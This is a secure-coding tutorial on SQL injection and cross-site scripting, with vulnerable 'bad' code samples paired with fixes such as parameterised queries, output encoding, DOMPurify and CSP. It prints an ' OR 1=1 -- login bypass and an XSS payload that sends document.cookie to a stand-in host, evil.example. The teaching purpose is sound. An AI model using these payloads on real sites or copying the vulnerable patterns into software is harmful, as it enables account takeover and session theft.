---
sources:
  - title: SQL Injection Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
    publisher: OWASP
  - title: Cross Site Scripting Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
    publisher: OWASP
  - title: SQL injection
    url: https://portswigger.net/web-security/sql-injection
    publisher: PortSwigger Web Security Academy
  - title: Cross-site scripting (XSS)
    url: https://portswigger.net/web-security/cross-site-scripting
    publisher: PortSwigger Web Security Academy
  - title: Cross-site scripting (XSS)
    url: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS
    publisher: MDN Web Docs
---

## One root cause

**Injection** happens when untrusted input is mixed into something that is _interpreted_: a SQL query, an HTML page, a shell command. The interpreter cannot tell where your code ends and the attacker's data begins. The cure is always the same idea: **keep code and data separate**, so input is only ever treated as data.

Two forms matter most to web developers: SQL injection (the server's database interprets the input) and cross-site scripting, or **XSS** (the victim's browser interprets the input as script). Which side defends? SQL injection is purely a server problem. XSS is a browser problem caused by what the page renders, and both sides share it.

## SQL injection

### The attack

```ts bad title="String concatenation builds the query"
app.post('/api/login', async (req, res) => {
	const { email, password } = req.body;
	const sql = `SELECT * FROM users WHERE email = '${email}' AND password_hash = '${password}'`;
	const { rows } = await db.query(sql);
	if (rows.length > 0) return res.json({ ok: true });
	res.status(401).end();
});
```

Step by step: the attacker types `' OR 1=1 --` as the email. The server builds:

```sql
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password_hash = '...'
```

The quote closes the string, `OR 1=1` is always true, and `--` turns the rest of the line into a comment. The query returns every user, so the attacker is logged in as the first one, often an admin. Variations extract whole tables or change data. The input escaped from "data" into "code".

### The defence: parameterised queries

A **parameterised query** (prepared statement) sends the SQL text and the values to the database separately. The database parses the SQL first, then plugs values in as plain data, so a quote in a value is just a character.

```ts good title="Placeholders keep data out of the SQL"
const { rows } = await db.query('SELECT id, password_hash FROM users WHERE email = $1', [email]);
const user = rows[0];
if (!user || !(await verifyPassword(password, user.password_hash))) {
	return res.status(401).json({ error: 'invalid_credentials' });
}
```

The same input `' OR 1=1 --` is now searched for as a literal email, and matches nobody. ORMs and query builders (Drizzle, Prisma, Kysely) do this for you, but they have raw escape hatches: any template string you concatenate yourself brings the bug back. See [database](/backend/database).

Placeholders only work for values. You cannot parameterise a table name, a column or `ORDER BY` direction, so use an allow-list:

```ts good title="Allow-list for identifiers"
const SORTABLE = new Set(['created_at', 'total_cents']);
const column = SORTABLE.has(req.query.sort as string) ? (req.query.sort as string) : 'created_at';
const { rows } = await db.query(`SELECT id, total_cents FROM orders ORDER BY ${column} LIMIT 50`);
```

The same principle covers shell commands (pass arguments as an array to `execFile`, never build a string for `exec`), LDAP, and NoSQL queries where an object from JSON can contain operators.

## XSS: injection into the page

**Cross-site scripting (XSS)** is when an attacker gets their JavaScript to run inside _your_ page, in the victim's browser. That script has everything your own code has: the user's session actions, the DOM, any data on screen, and requests to your API with their cookies.

Kinds: **stored** (the payload is saved, such as in a comment, and served to every viewer), **reflected** (it travels in a link and is echoed back), and **DOM-based** (client-side code writes it into the page).

### The attack

```svelte bad title="Rendering user content as raw HTML"
<script lang="ts">
	let { comment } = $props<{ comment: { author: string; body: string } }>();
</script>

<p>{@html comment.body}</p>
```

Step by step: the attacker posts a comment containing `<img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)">`. The image fails to load, `onerror` fires, and the script runs for every visitor who opens the page. It can read non-`httpOnly` cookies, call APIs as the victim, or change what they see. The same bug appears in plain JavaScript with `innerHTML`:

```ts bad title="innerHTML with untrusted data"
container.innerHTML = `<h2>Results for ${new URLSearchParams(location.search).get('q')}</h2>`;
```

### The defence: output encoding

**Output encoding** converts characters that have meaning in HTML (`<`, `>`, `&`, quotes) into harmless text, at the moment of output and for the context it lands in. Modern frameworks do this by default, which is why the safe version is simply the normal one.

```svelte good title="Normal interpolation is escaped automatically"
<p>{comment.body}</p>
```

```ts good title="textContent for plain DOM code"
const h2 = document.createElement('h2');
h2.textContent = `Results for ${q}`; // treated as text, never as HTML
container.replaceChildren(h2);
```

The attacker's `<img ...>` now appears on screen as literal text. Encoding is context-specific: text in HTML, attribute values, URLs and inside script blocks each need different handling, which is why you rely on the framework rather than doing it by hand.

### When you really need HTML

Rich-text comments or CMS content require rendering HTML. Then **sanitise** it: parse it and strip everything outside an allow-list of safe tags and attributes, using a maintained library such as DOMPurify, ideally on the server before storing and again before rendering. Never write your own regex filter; attackers know dozens of encodings that slip past.

Other dangerous sinks: `eval`, `new Function`, `javascript:` URLs (check that user-supplied links start with `https:` or `http:`), and `postMessage` data used without checking the origin.

### Defence in depth

- A **Content Security Policy (CSP)**, a response header listing which scripts the browser may run, limits the damage if encoding fails. It does not replace encoding; see [headers](/security/transport-and-headers).
- `httpOnly` cookies keep sessions out of reach of scripts ([authentication](/security/authentication)).
- Validate input shape on the server ([validation](/backend/validation-and-errors)), but do not rely on blocklists such as "remove script tags".

## Trade-offs

Input validation is useful but cannot be the main defence: a name like `O'Brien` is legitimate, and the right escaping depends on where the data ends up, which is unknown at input time. Encode on output, validate on input, and keep a CSP as the safety net.

## Checklist

- Every SQL value goes through placeholders; dynamic identifiers use an allow-list.
- Raw SQL, `exec` and template-string queries are flagged in code review.
- No `@html` or `innerHTML` with untrusted data; if unavoidable, sanitise with a maintained library.
- User-supplied URLs are checked for allowed schemes.
- A CSP and `httpOnly` cookies are in place as backup.
- The database account has only the permissions the app needs.
